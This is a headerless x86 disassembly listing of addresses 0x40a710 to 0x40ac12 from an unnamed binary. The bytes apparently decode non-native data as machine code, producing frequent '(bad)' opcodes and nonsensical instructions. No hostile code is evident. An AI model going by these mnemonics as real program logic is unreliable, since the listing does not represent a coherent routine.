  40a710:	2a 31                	sub    (%ecx),%dh
  40a712:	78 ff                	js     0x40a713
  40a714:	32 04 00             	xor    (%eax,%eax,1),%al
  40a717:	5c                   	pop    %esp
  40a718:	ff 44 ff 00          	incl   0x0(%edi,%edi,8)
  40a71c:	02 00                	add    (%eax),%al
  40a71e:	0e                   	push   %cs
  40a71f:	6c                   	insb   (%dx),%es:(%edi)
  40a720:	6c                   	insb   (%dx),%es:(%edi)
  40a721:	ff f5                	push   %ebp
  40a723:	01 00                	add    %eax,(%eax)
  40a725:	00 00                	add    %al,(%eax)
  40a727:	aa                   	stos   %al,%es:(%edi)
  40a728:	71 6c                	jno    0x40a796
  40a72a:	ff 00                	incl   (%eax)
  40a72c:	05 1e 76 00 00       	add    $0x761e,%eax
  40a731:	0d 6c 78 ff 1b       	or     $0x1bff786c,%eax
  40a736:	05 00 fb 3d 1c       	add    $0x1c3dfb00,%eax
  40a73b:	7c 01                	jl     0x40a73e
  40a73d:	00 17                	add    %dl,(%edi)
  40a73f:	6c                   	insb   (%dx),%es:(%edi)
  40a740:	78 ff                	js     0x40a741
  40a742:	4a                   	dec    %edx
  40a743:	f5                   	cmc
  40a744:	01 00                	add    %eax,(%eax)
  40a746:	00 00                	add    %al,(%eax)
  40a748:	ae                   	scas   %es:(%edi),%al
  40a749:	6c                   	insb   (%dx),%es:(%edi)
  40a74a:	78 ff                	js     0x40a74b
  40a74c:	0b 0f                	or     (%edi),%ecx
  40a74e:	00 08                	add    %cl,(%eax)
  40a750:	00 31                	add    %dh,(%ecx)
  40a752:	78 ff                	js     0x40a753
  40a754:	00 14 6c             	add    %dl,(%esp,%ebp,2)
  40a757:	74 ff                	je     0x40a758
  40a759:	5e                   	pop    %esi
  40a75a:	03 00                	add    (%eax),%eax
  40a75c:	04 00                	add    $0x0,%al
  40a75e:	71 58                	jno    0x40a7b8
  40a760:	ff                   	(bad)
  40a761:	3c 6c                	cmp    $0x6c,%al
  40a763:	58                   	pop    %eax
  40a764:	ff 71 70             	push   0x70(%ecx)
  40a767:	ff 00                	incl   (%eax)
  40a769:	00 14 00             	add    %dl,(%eax,%eax,1)
  40a76c:	8c 71 40             	mov    %?,0x40(%ecx)
  40a76f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40a772:	38 00                	cmp    %al,(%eax)
  40a774:	94                   	xchg   %eax,%esp
  40a775:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  40a778:	00 00                	add    %al,(%eax)
  40a77a:	00 00                	add    %al,(%eax)
  40a77c:	00 00                	add    %al,(%eax)
  40a77e:	13 00                	adc    (%eax),%eax
  40a780:	00 00                	add    %al,(%eax)
  40a782:	00 00                	add    %al,(%eax)
  40a784:	14 00                	adc    $0x0,%al
  40a786:	00 00                	add    %al,(%eax)
  40a788:	00 00                	add    %al,(%eax)
  40a78a:	02 00                	add    (%eax),%al
  40a78c:	00 00                	add    %al,(%eax)
  40a78e:	00 01                	add    %al,(%ecx)
  40a790:	78 ff                	js     0x40a791
  40a792:	01 00                	add    %eax,(%eax)
  40a794:	68 ff 01 00 18       	push   $0x180001ff
  40a799:	00 00                	add    %al,(%eax)
  40a79b:	00 00                	add    %al,(%eax)
  40a79d:	00 03                	add    %al,(%ebx)
  40a79f:	00 00                	add    %al,(%eax)
  40a7a1:	00 00                	add    %al,(%eax)
  40a7a3:	00 5c ff 01          	add    %bl,0x1(%edi,%edi,8)
  40a7a7:	00 44 ff 01          	add    %al,0x1(%edi,%edi,8)
  40a7ab:	00 48 ff             	add    %cl,-0x1(%eax)
  40a7ae:	02 00                	add    (%eax),%al
  40a7b0:	00 02                	add    %al,(%edx)
  40a7b2:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40a7b8:	36 04 74             	ss add $0x74,%al
  40a7bb:	ff f5                	push   %ebp
  40a7bd:	08 00                	or     %al,(%eax)
  40a7bf:	00 00                	add    %al,(%eax)
  40a7c1:	f5                   	cmc
  40a7c2:	00 00                	add    %al,(%eax)
  40a7c4:	00 00                	add    %al,(%eax)
  40a7c6:	80 10 00             	adcb   $0x0,(%eax)
  40a7c9:	04 50                	add    $0x50,%al
  40a7cb:	ff 34 6c             	push   (%esp,%ebp,2)
  40a7ce:	50                   	push   %eax
  40a7cf:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  40a7d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  40a7d8:	71 4c                	jno    0x40a826
  40a7da:	ff                   	(bad)
  40a7db:	3c 6c                	cmp    $0x6c,%al
  40a7dd:	50                   	push   %eax
  40a7de:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  40a7e2:	fc                   	cld
  40a7e3:	58                   	pop    %eax
  40a7e4:	6c                   	insb   (%dx),%es:(%edi)
  40a7e5:	4c                   	dec    %esp
  40a7e6:	ff 71 70             	push   0x70(%ecx)
  40a7e9:	ff 2f                	ljmp   *(%edi)
  40a7eb:	50                   	push   %eax
  40a7ec:	ff 00                	incl   (%eax)
  40a7ee:	0e                   	push   %cs
  40a7ef:	6c                   	insb   (%dx),%es:(%edi)
  40a7f0:	70 ff                	jo     0x40a7f1
  40a7f2:	f5                   	cmc
  40a7f3:	00 00                	add    %al,(%eax)
  40a7f5:	00 00                	add    %al,(%eax)
  40a7f7:	cc                   	int3
  40a7f8:	1c 6a                	sbb    $0x6a,%al
  40a7fa:	00 00                	add    %al,(%eax)
  40a7fc:	08 1b                	or     %bl,(%ebx)
  40a7fe:	05 00 43 78 ff       	add    $0xff784300,%eax
  40a803:	00 14 6c             	add    %dl,(%esp,%ebp,2)
  40a806:	74 ff                	je     0x40a807
  40a808:	5e                   	pop    %esi
  40a809:	03 00                	add    (%eax),%eax
  40a80b:	04 00                	add    $0x0,%al
  40a80d:	71 4c                	jno    0x40a85b
  40a80f:	ff                   	(bad)
  40a810:	3c 6c                	cmp    $0x6c,%al
  40a812:	4c                   	dec    %esp
  40a813:	ff 71 70             	push   0x70(%ecx)
  40a816:	ff 00                	incl   (%eax)
  40a818:	03 14 00             	add    (%eax,%eax,1),%edx
  40a81b:	02 00                	add    (%eax),%al
  40a81d:	0a f5                	or     %ch,%dh
  40a81f:	00 00                	add    %al,(%eax)
  40a821:	00 00                	add    %al,(%eax)
  40a823:	71 6c                	jno    0x40a891
  40a825:	ff 00                	incl   (%eax)
  40a827:	0e                   	push   %cs
  40a828:	6c                   	insb   (%dx),%es:(%edi)
  40a829:	70 ff                	jo     0x40a82a
  40a82b:	f5                   	cmc
  40a82c:	00 00                	add    %al,(%eax)
  40a82e:	00 00                	add    %al,(%eax)
  40a830:	c7                   	(bad)
  40a831:	1c 73                	sbb    $0x73,%al
  40a833:	01 00                	add    %eax,(%eax)
  40a835:	19 f5                	sbb    %esi,%ebp
  40a837:	ff 00                	incl   (%eax)
  40a839:	00 00                	add    %al,(%eax)
  40a83b:	04 3c                	add    $0x3c,%al
  40a83d:	ff 0a                	decl   (%edx)
  40a83f:	0d 00 08 00 04       	or     $0x4000800,%eax
  40a844:	3c ff                	cmp    $0xff,%al
  40a846:	60                   	pusha
  40a847:	31 68 ff             	xor    %ebp,-0x1(%eax)
  40a84a:	35 3c ff 00 19       	xor    $0x1900ff3c,%eax
  40a84f:	f5                   	cmc
  40a850:	ff 00                	incl   (%eax)
  40a852:	00 00                	add    %al,(%eax)
  40a854:	04 3c                	add    $0x3c,%al
  40a856:	ff 0a                	decl   (%edx)
  40a858:	0d 00 08 00 04       	or     $0x4000800,%eax
  40a85d:	3c ff                	cmp    $0xff,%al
  40a85f:	60                   	pusha
  40a860:	31 60 ff             	xor    %esp,-0x1(%eax)
  40a863:	35 3c ff 00 0a       	xor    $0xa00ff3c,%eax
  40a868:	f5                   	cmc
  40a869:	ff 00                	incl   (%eax)
  40a86b:	00 00                	add    %al,(%eax)
  40a86d:	71 64                	jno    0x40a8d3
  40a86f:	ff 00                	incl   (%eax)
  40a871:	0a f5                	or     %ch,%dh
  40a873:	ff 00                	incl   (%eax)
  40a875:	00 00                	add    %al,(%eax)
  40a877:	71 5c                	jno    0x40a8d5
  40a879:	ff 00                	incl   (%eax)
  40a87b:	50                   	push   %eax
  40a87c:	04 54                	add    $0x54,%al
  40a87e:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a881:	ff 6c 60 ff          	ljmp   *-0x1(%eax,%eiz,2)
  40a885:	04 38                	add    $0x38,%al
  40a887:	ff 34 6c             	push   (%esp,%ebp,2)
  40a88a:	38 ff                	cmp    %bh,%bh
  40a88c:	f5                   	cmc
  40a88d:	00 00                	add    %al,(%eax)
  40a88f:	00 00                	add    %al,(%eax)
  40a891:	04 64                	add    $0x64,%al
  40a893:	ff 6c 68 ff          	ljmp   *-0x1(%eax,%ebp,2)
  40a897:	04 50                	add    $0x50,%al
  40a899:	ff 34 6c             	push   (%esp,%ebp,2)
  40a89c:	50                   	push   %eax
  40a89d:	ff 6c 6c ff          	ljmp   *-0x1(%esp,%ebp,2)
  40a8a1:	6c                   	insb   (%dx),%es:(%edi)
  40a8a2:	74 ff                	je     0x40a8a3
  40a8a4:	5e                   	pop    %esi
  40a8a5:	0e                   	push   %cs
  40a8a6:	00 20                	add    %ah,(%eax)
  40a8a8:	00 71 4c             	add    %dh,0x4c(%ecx)
  40a8ab:	ff                   	(bad)
  40a8ac:	3c 6c                	cmp    $0x6c,%al
  40a8ae:	50                   	push   %eax
  40a8af:	ff 04 68             	incl   (%eax,%ebp,2)
  40a8b2:	ff                   	(bad)
  40a8b3:	fc                   	cld
  40a8b4:	58                   	pop    %eax
  40a8b5:	6c                   	insb   (%dx),%es:(%edi)
  40a8b6:	38 ff                	cmp    %bh,%bh
  40a8b8:	04 60                	add    $0x60,%al
  40a8ba:	ff                   	(bad)
  40a8bb:	fc                   	cld
  40a8bc:	58                   	pop    %eax
  40a8bd:	6c                   	insb   (%dx),%es:(%edi)
  40a8be:	4c                   	dec    %esp
  40a8bf:	ff 71 70             	push   0x70(%ecx)
  40a8c2:	ff 32                	push   (%edx)
  40a8c4:	04 00                	add    $0x0,%al
  40a8c6:	50                   	push   %eax
  40a8c7:	ff                   	(bad)
  40a8c8:	38 ff                	cmp    %bh,%bh
  40a8ca:	00 0e                	add    %cl,(%esi)
  40a8cc:	6c                   	insb   (%dx),%es:(%edi)
  40a8cd:	70 ff                	jo     0x40a8ce
  40a8cf:	f5                   	cmc
  40a8d0:	00 00                	add    %al,(%eax)
  40a8d2:	00 00                	add    %al,(%eax)
  40a8d4:	c7                   	(bad)
  40a8d5:	1c 5e                	sbb    $0x5e,%al
  40a8d7:	01 00                	add    %eax,(%eax)
  40a8d9:	10 6c 64 ff          	adc    %ch,-0x1(%esp,%eiz,2)
  40a8dd:	6c                   	insb   (%dx),%es:(%edi)
  40a8de:	68 ff 0b 0f 00       	push   $0xf0bff
  40a8e3:	08 00                	or     %al,(%eax)
  40a8e5:	31 68 ff             	xor    %ebp,-0x1(%eax)
  40a8e8:	00 10                	add    %dl,(%eax)
  40a8ea:	6c                   	insb   (%dx),%es:(%edi)
  40a8eb:	5c                   	pop    %esp
  40a8ec:	ff 6c 60 ff          	ljmp   *-0x1(%eax,%eiz,2)
  40a8f0:	0b 0f                	or     (%edi),%ecx
  40a8f2:	00 08                	add    %cl,(%eax)
  40a8f4:	00 31                	add    %dh,(%ecx)
  40a8f6:	60                   	pusha
  40a8f7:	ff 00                	incl   (%eax)
  40a8f9:	16                   	push   %ss
  40a8fa:	6c                   	insb   (%dx),%es:(%edi)
  40a8fb:	78 ff                	js     0x40a8fc
  40a8fd:	6c                   	insb   (%dx),%es:(%edi)
  40a8fe:	68 ff 2a 23 50       	push   $0x50232aff
  40a903:	ff 1b                	lcall  *(%ebx)
  40a905:	10 00                	adc    %al,(%eax)
  40a907:	2a 31                	sub    (%ecx),%dh
  40a909:	78 ff                	js     0x40a90a
  40a90b:	2f                   	das
  40a90c:	50                   	push   %eax
  40a90d:	ff 00                	incl   (%eax)
  40a90f:	02 00                	add    (%eax),%al
  40a911:	0e                   	push   %cs
  40a912:	6c                   	insb   (%dx),%es:(%edi)
  40a913:	6c                   	insb   (%dx),%es:(%edi)
  40a914:	ff f5                	push   %ebp
  40a916:	01 00                	add    %eax,(%eax)
  40a918:	00 00                	add    %al,(%eax)
  40a91a:	aa                   	stos   %al,%es:(%edi)
  40a91b:	71 6c                	jno    0x40a989
  40a91d:	ff 00                	incl   (%eax)
  40a91f:	05 1e 76 00 00       	add    $0x761e,%eax
  40a924:	0d 6c 78 ff 1b       	or     $0x1bff786c,%eax
  40a929:	05 00 fb 3d 1c       	add    $0x1c3dfb00,%eax
  40a92e:	97                   	xchg   %eax,%edi
  40a92f:	01 00                	add    %eax,(%eax)
  40a931:	17                   	pop    %ss
  40a932:	6c                   	insb   (%dx),%es:(%edi)
  40a933:	78 ff                	js     0x40a934
  40a935:	4a                   	dec    %edx
  40a936:	f5                   	cmc
  40a937:	01 00                	add    %eax,(%eax)
  40a939:	00 00                	add    %al,(%eax)
  40a93b:	ae                   	scas   %es:(%edi),%al
  40a93c:	6c                   	insb   (%dx),%es:(%edi)
  40a93d:	78 ff                	js     0x40a93e
  40a93f:	0b 0f                	or     (%edi),%ecx
  40a941:	00 08                	add    %cl,(%eax)
  40a943:	00 31                	add    %dh,(%ecx)
  40a945:	78 ff                	js     0x40a946
  40a947:	00 14 6c             	add    %dl,(%esp,%ebp,2)
  40a94a:	74 ff                	je     0x40a94b
  40a94c:	5e                   	pop    %esi
  40a94d:	03 00                	add    (%eax),%eax
  40a94f:	04 00                	add    $0x0,%al
  40a951:	71 4c                	jno    0x40a99f
  40a953:	ff                   	(bad)
  40a954:	3c 6c                	cmp    $0x6c,%al
  40a956:	4c                   	dec    %esp
  40a957:	ff 71 70             	push   0x70(%ecx)
  40a95a:	ff 00                	incl   (%eax)
  40a95c:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  40a95f:	00 8c 71 40 00 0c 00 	add    %cl,0xc0040(%ecx,%esi,2)
  40a966:	44                   	inc    %esp
  40a967:	00 b0 01 30 00 00    	add    %dh,0x3001(%eax)
  40a96d:	00 00                	add    %al,(%eax)
  40a96f:	00 00                	add    %al,(%eax)
  40a971:	00 13                	add    %dl,(%ebx)
  40a973:	00 00                	add    %al,(%eax)
  40a975:	00 00                	add    %al,(%eax)
  40a977:	00 18                	add    %bl,(%eax)
  40a979:	00 00                	add    %al,(%eax)
  40a97b:	00 00                	add    %al,(%eax)
  40a97d:	00 03                	add    %al,(%ebx)
  40a97f:	00 00                	add    %al,(%eax)
  40a981:	00 00                	add    %al,(%eax)
  40a983:	01 78 ff             	add    %edi,-0x1(%eax)
  40a986:	01 00                	add    %eax,(%eax)
  40a988:	60                   	pusha
  40a989:	ff 01                	incl   (%ecx)
  40a98b:	00 68 ff             	add    %ch,-0x1(%eax)
  40a98e:	01 00                	add    %eax,(%eax)
  40a990:	18 00                	sbb    %al,(%eax)
  40a992:	00 00                	add    %al,(%eax)
  40a994:	00 00                	add    %al,(%eax)
  40a996:	03 00                	add    (%eax),%eax
  40a998:	00 00                	add    %al,(%eax)
  40a99a:	00 00                	add    %al,(%eax)
  40a99c:	50                   	push   %eax
  40a99d:	ff 01                	incl   (%ecx)
  40a99f:	00 38                	add    %bh,(%eax)
  40a9a1:	ff 01                	incl   (%ecx)
  40a9a3:	00 3c ff             	add    %bh,(%edi,%edi,8)
  40a9a6:	02 00                	add    (%eax),%al
  40a9a8:	00 02                	add    %al,(%edx)
  40a9aa:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40a9b0:	0a f5                	or     %ch,%dh
  40a9b2:	0a 00                	or     (%eax),%al
  40a9b4:	00 00                	add    %al,(%eax)
  40a9b6:	71 68                	jno    0x40aa20
  40a9b8:	ff 00                	incl   (%eax)
  40a9ba:	0a f5                	or     %ch,%dh
  40a9bc:	00 00                	add    %al,(%eax)
  40a9be:	00 00                	add    %al,(%eax)
  40a9c0:	71 6c                	jno    0x40aa2e
  40a9c2:	ff 00                	incl   (%eax)
  40a9c4:	07                   	pop    %es
  40a9c5:	f4                   	hlt
  40a9c6:	ff 70 70             	push   0x70(%eax)
  40a9c9:	ff 00                	incl   (%eax)
  40a9cb:	4f                   	dec    %edi
  40a9cc:	04 64                	add    $0x64,%al
  40a9ce:	ff 04 74             	incl   (%esp,%esi,2)
  40a9d1:	ff 04 68             	incl   (%eax,%ebp,2)
  40a9d4:	ff f5                	push   %ebp
  40a9d6:	06                   	push   %es
  40a9d7:	00 02                	add    %al,(%edx)
  40a9d9:	00 f5                	add    %dh,%ch
  40a9db:	00 00                	add    %al,(%eax)
  40a9dd:	00 00                	add    %al,(%eax)
  40a9df:	1b 05 00 04 58 ff    	sbb    0xff580400,%eax
  40a9e5:	34 6c                	xor    $0x6c,%al
  40a9e7:	58                   	pop    %eax
  40a9e8:	ff f5                	push   %ebp
  40a9ea:	00 00                	add    %al,(%eax)
  40a9ec:	00 00                	add    %al,(%eax)
  40a9ee:	80 14 00 04          	adcb   $0x4,(%eax,%eax,1)
  40a9f2:	5c                   	pop    %esp
  40a9f3:	ff 34 6c             	push   (%esp,%ebp,2)
  40a9f6:	5c                   	pop    %esp
  40a9f7:	ff 80 10 00 5e 0b    	incl   0xb5e0010(%eax)
  40a9fd:	00 24 00             	add    %ah,(%eax,%eax,1)
  40aa00:	71 54                	jno    0x40aa56
  40aa02:	ff                   	(bad)
  40aa03:	3c 6c                	cmp    $0x6c,%al
  40aa05:	5c                   	pop    %esp
  40aa06:	ff 6c 14 00          	ljmp   *0x0(%esp,%edx,1)
  40aa0a:	fc                   	cld
  40aa0b:	58                   	pop    %eax
  40aa0c:	6c                   	insb   (%dx),%es:(%edi)
  40aa0d:	54                   	push   %esp
  40aa0e:	ff 71 60             	push   0x60(%ecx)
  40aa11:	ff 32                	push   (%edx)
  40aa13:	04 00                	add    $0x0,%al
  40aa15:	5c                   	pop    %esp
  40aa16:	ff 58 ff             	lcall  *-0x1(%eax)
  40aa19:	00 0e                	add    %cl,(%esi)
  40aa1b:	6c                   	insb   (%dx),%es:(%edi)
  40aa1c:	60                   	pusha
  40aa1d:	ff f5                	push   %ebp
  40aa1f:	00 00                	add    %al,(%eax)
  40aa21:	00 00                	add    %al,(%eax)
  40aa23:	cc                   	int3
  40aa24:	1c 9d                	sbb    $0x9d,%al
  40aa26:	00 00                	add    %al,(%eax)
  40aa28:	07                   	pop    %es
  40aa29:	f4                   	hlt
  40aa2a:	00 70 7a             	add    %dh,0x7a(%eax)
  40aa2d:	ff 00                	incl   (%eax)
  40aa2f:	14 6c                	adc    $0x6c,%al
  40aa31:	74 ff                	je     0x40aa32
  40aa33:	5e                   	pop    %esi
  40aa34:	03 00                	add    (%eax),%eax
  40aa36:	04 00                	add    $0x0,%al
  40aa38:	71 54                	jno    0x40aa8e
  40aa3a:	ff                   	(bad)
  40aa3b:	3c 6c                	cmp    $0x6c,%al
  40aa3d:	54                   	push   %esp
  40aa3e:	ff 71 60             	push   0x60(%ecx)
  40aa41:	ff 00                	incl   (%eax)
  40aa43:	03 15 00 02 00 ff    	add    0xff000200,%edx
  40aa49:	80 0c 00 71          	orb    $0x71,(%eax,%eax,1)
  40aa4d:	50                   	push   %eax
  40aa4e:	ff 00                	incl   (%eax)
  40aa50:	0e                   	push   %cs
  40aa51:	6c                   	insb   (%dx),%es:(%edi)
  40aa52:	50                   	push   %eax
  40aa53:	ff f5                	push   %ebp
  40aa55:	01 00                	add    %eax,(%eax)
  40aa57:	00 00                	add    %al,(%eax)
  40aa59:	c7                   	(bad)
  40aa5a:	1c 03                	sbb    $0x3,%al
  40aa5c:	01 00                	add    %eax,(%eax)
  40aa5e:	4b                   	dec    %ebx
  40aa5f:	80 1c 00 4a          	sbbb   $0x4a,(%eax,%eax,1)
  40aa63:	80 1c 00 04          	sbbb   $0x4,(%eax,%eax,1)
  40aa67:	58                   	pop    %eax
  40aa68:	ff 34 6c             	push   (%esp,%ebp,2)
  40aa6b:	58                   	pop    %eax
  40aa6c:	ff 80 0c 00 f5 00    	incl   0xf5000c(%eax)
  40aa72:	00 00                	add    %al,(%eax)
  40aa74:	00 80 18 00 04 5c    	add    %al,0x5c040018(%eax)
  40aa7a:	ff 34 6c             	push   (%esp,%ebp,2)
  40aa7d:	5c                   	pop    %esp
  40aa7e:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  40aa82:	5e                   	pop    %esi
  40aa83:	0c 00                	or     $0x0,%al
  40aa85:	18 00                	sbb    %al,(%eax)
  40aa87:	71 54                	jno    0x40aadd
  40aa89:	ff                   	(bad)
  40aa8a:	3c 6c                	cmp    $0x6c,%al
  40aa8c:	5c                   	pop    %esp
  40aa8d:	ff 6c 18 00          	ljmp   *0x0(%eax,%ebx,1)
  40aa91:	fc                   	cld
  40aa92:	58                   	pop    %eax
  40aa93:	6c                   	insb   (%dx),%es:(%edi)
  40aa94:	58                   	pop    %eax
  40aa95:	ff 6c 1c 00          	ljmp   *0x0(%esp,%ebx,1)
  40aa99:	fc                   	cld
  40aa9a:	58                   	pop    %eax
  40aa9b:	6c                   	insb   (%dx),%es:(%edi)
  40aa9c:	54                   	push   %esp
  40aa9d:	ff 71 60             	push   0x60(%ecx)
  40aaa0:	ff 32                	push   (%edx)
  40aaa2:	04 00                	add    $0x0,%al
  40aaa4:	5c                   	pop    %esp
  40aaa5:	ff 58 ff             	lcall  *-0x1(%eax)
  40aaa8:	1e                   	push   %ds
  40aaa9:	9e                   	sahf
  40aaaa:	01 00                	add    %eax,(%eax)
  40aaac:	0e                   	push   %cs
  40aaad:	6c                   	insb   (%dx),%es:(%edi)
  40aaae:	50                   	push   %eax
  40aaaf:	ff f5                	push   %ebp
  40aab1:	04 00                	add    $0x0,%al
  40aab3:	00 00                	add    %al,(%eax)
  40aab5:	c7                   	(bad)
  40aab6:	1c 51                	sbb    $0x51,%al
  40aab8:	01 00                	add    %eax,(%eax)
  40aaba:	3d f5 04 00 00       	cmp    $0x4f5,%eax
  40aabf:	00 80 1c 00 50 59    	add    %al,0x5950001c(%eax)
  40aac5:	54                   	push   %esp
  40aac6:	ff 80 0c 00 f5 00    	incl   0xf5000c(%eax)
  40aacc:	00 00                	add    %al,(%eax)
  40aace:	00 80 18 00 04 5c    	add    %al,0x5c040018(%eax)
  40aad4:	ff 34 6c             	push   (%esp,%ebp,2)
  40aad7:	5c                   	pop    %esp
  40aad8:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  40aadc:	5e                   	pop    %esi
  40aadd:	0c 00                	or     $0x0,%al
  40aadf:	18 00                	sbb    %al,(%eax)
  40aae1:	71 4c                	jno    0x40ab2f
  40aae3:	ff                   	(bad)
  40aae4:	3c 6c                	cmp    $0x6c,%al
  40aae6:	5c                   	pop    %esp
  40aae7:	ff 6c 18 00          	ljmp   *0x0(%eax,%ebx,1)
  40aaeb:	fc                   	cld
  40aaec:	58                   	pop    %eax
  40aaed:	6c                   	insb   (%dx),%es:(%edi)
  40aaee:	4c                   	dec    %esp
  40aaef:	ff 71 60             	push   0x60(%ecx)
  40aaf2:	ff 2f                	ljmp   *(%edi)
  40aaf4:	5c                   	pop    %esp
  40aaf5:	ff 1e                	lcall  *(%esi)
  40aaf7:	9e                   	sahf
  40aaf8:	01 00                	add    %eax,(%eax)
  40aafa:	0e                   	push   %cs
  40aafb:	6c                   	insb   (%dx),%es:(%edi)
  40aafc:	50                   	push   %eax
  40aafd:	ff f5                	push   %ebp
  40aaff:	03 00                	add    (%eax),%eax
  40ab01:	00 00                	add    %al,(%eax)
  40ab03:	c7                   	(bad)
  40ab04:	1c 9e                	sbb    $0x9e,%al
  40ab06:	01 00                	add    %eax,(%eax)
  40ab08:	3f                   	aas
  40ab09:	f5                   	cmc
  40ab0a:	04 00                	add    $0x0,%al
  40ab0c:	00 00                	add    %al,(%eax)
  40ab0e:	80 1c 00 fc          	sbbb   $0xfc,(%eax,%eax,1)
  40ab12:	13 fd                	adc    %ebp,%edi
  40ab14:	c2 4a ff             	ret    $0xff4a
  40ab17:	80 0c 00 f5          	orb    $0xf5,(%eax,%eax,1)
  40ab1b:	00 00                	add    %al,(%eax)
  40ab1d:	00 00                	add    %al,(%eax)
  40ab1f:	80 18 00             	sbbb   $0x0,(%eax)
  40ab22:	04 5c                	add    $0x5c,%al
  40ab24:	ff 34 6c             	push   (%esp,%ebp,2)
  40ab27:	5c                   	pop    %esp
  40ab28:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  40ab2c:	5e                   	pop    %esi
  40ab2d:	0c 00                	or     $0x0,%al
  40ab2f:	18 00                	sbb    %al,(%eax)
  40ab31:	71 54                	jno    0x40ab87
  40ab33:	ff                   	(bad)
  40ab34:	3c 6c                	cmp    $0x6c,%al
  40ab36:	5c                   	pop    %esp
  40ab37:	ff 6c 18 00          	ljmp   *0x0(%eax,%ebx,1)
  40ab3b:	fc                   	cld
  40ab3c:	58                   	pop    %eax
  40ab3d:	6c                   	insb   (%dx),%es:(%edi)
  40ab3e:	54                   	push   %esp
  40ab3f:	ff 71 60             	push   0x60(%ecx)
  40ab42:	ff 2f                	ljmp   *(%edi)
  40ab44:	5c                   	pop    %esp
  40ab45:	ff 00                	incl   (%eax)
  40ab47:	02 00                	add    (%eax),%al
  40ab49:	0e                   	push   %cs
  40ab4a:	6c                   	insb   (%dx),%es:(%edi)
  40ab4b:	60                   	pusha
  40ab4c:	ff f5                	push   %ebp
  40ab4e:	00 00                	add    %al,(%eax)
  40ab50:	00 00                	add    %al,(%eax)
  40ab52:	c7                   	(bad)
  40ab53:	1c b8                	sbb    $0xb8,%al
  40ab55:	01 00                	add    %eax,(%eax)
  40ab57:	07                   	pop    %es
  40ab58:	f4                   	hlt
  40ab59:	ff 70 7a             	push   0x7a(%eax)
  40ab5c:	ff 1e                	lcall  *(%esi)
  40ab5e:	c1 01 00             	roll   $0x0,(%ecx)
  40ab61:	02 00                	add    (%eax),%al
  40ab63:	07                   	pop    %es
  40ab64:	f4                   	hlt
  40ab65:	00 70 7a             	add    %dh,0x7a(%eax)
  40ab68:	ff 00                	incl   (%eax)
  40ab6a:	02 00                	add    (%eax),%al
  40ab6c:	14 6c                	adc    $0x6c,%al
  40ab6e:	74 ff                	je     0x40ab6f
  40ab70:	5e                   	pop    %esi
  40ab71:	03 00                	add    (%eax),%eax
  40ab73:	04 00                	add    $0x0,%al
  40ab75:	71 54                	jno    0x40abcb
  40ab77:	ff                   	(bad)
  40ab78:	3c 6c                	cmp    $0x6c,%al
  40ab7a:	54                   	push   %esp
  40ab7b:	ff 71 60             	push   0x60(%ecx)
  40ab7e:	ff 00                	incl   (%eax)
  40ab80:	00 15 00 00 8c 71    	add    %dl,0x718c0000
  40ab86:	40                   	inc    %eax
  40ab87:	00 18                	add    %bl,(%eax)
  40ab89:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab8c:	dc 01                	faddl  (%ecx)
  40ab8e:	24 00                	and    $0x0,%al
  40ab90:	00 00                	add    %al,(%eax)
  40ab92:	00 00                	add    %al,(%eax)
  40ab94:	00 00                	add    %al,(%eax)
  40ab96:	13 00                	adc    (%eax),%eax
  40ab98:	00 00                	add    %al,(%eax)
  40ab9a:	00 00                	add    %al,(%eax)
  40ab9c:	0c 00                	or     $0x0,%al
	...
  40aba6:	00 00                	add    %al,(%eax)
  40aba8:	14 00                	adc    $0x0,%al
  40abaa:	00 00                	add    %al,(%eax)
  40abac:	00 00                	add    %al,(%eax)
  40abae:	02 00                	add    (%eax),%al
  40abb0:	00 00                	add    %al,(%eax)
  40abb2:	00 00                	add    %al,(%eax)
  40abb4:	5c                   	pop    %esp
  40abb5:	ff 01                	incl   (%ecx)
  40abb7:	00 58 ff             	add    %bl,-0x1(%eax)
  40abba:	01 00                	add    %eax,(%eax)
  40abbc:	00 02                	add    %al,(%edx)
  40abbe:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40abc4:	1a f5                	sbb    %ch,%dh
  40abc6:	00 00                	add    %al,(%eax)
  40abc8:	00 00                	add    %al,(%eax)
  40abca:	1b 00                	sbb    (%eax),%eax
  40abcc:	00 04 1c             	add    %al,(%esp,%ebx,1)
  40abcf:	ff 0a                	decl   (%edx)
  40abd1:	01 00                	add    %eax,(%eax)
  40abd3:	0c 00                	or     $0x0,%al
  40abd5:	04 1c                	add    $0x1c,%al
  40abd7:	ff 04 6c             	incl   (%esp,%ebp,2)
  40abda:	ff                   	(bad)
  40abdb:	fe 4e 02             	decb   0x2(%esi)
  40abde:	00 f5                	add    %dh,%ch
  40abe0:	00 00                	add    %al,(%eax)
  40abe2:	00 00                	add    %al,(%eax)
  40abe4:	f5                   	cmc
  40abe5:	15 00 00 00 04       	adc    $0x4000000,%eax
  40abea:	18 ff                	sbb    %bh,%bh
  40abec:	fe 8e 01 00 00 00    	decb   0x1(%esi)
  40abf2:	10 00                	adc    %al,(%eax)
  40abf4:	80 08 28             	orb    $0x28,(%eax)
  40abf7:	08 ff                	or     %bh,%bh
  40abf9:	50                   	push   %eax
  40abfa:	00 f5                	add    %dh,%ch
  40abfc:	00 00                	add    %al,(%eax)
  40abfe:	00 00                	add    %al,(%eax)
  40ac00:	6c                   	insb   (%dx),%es:(%edi)
  40ac01:	18 ff                	sbb    %bh,%bh
  40ac03:	52                   	push   %edx
  40ac04:	28 f8                	sub    %bh,%al
  40ac06:	fe 4b 00             	decb   0x0(%ebx)
  40ac09:	f5                   	cmc
  40ac0a:	01 00                	add    %eax,(%eax)
  40ac0c:	00 00                	add    %al,(%eax)
  40ac0e:	6c                   	insb   (%dx),%es:(%edi)
  40ac0f:	18 ff                	sbb    %bh,%bh
  40ac11:	52                   	push   %edx
  40ac12:	28 e8                	sub    %ch,%al
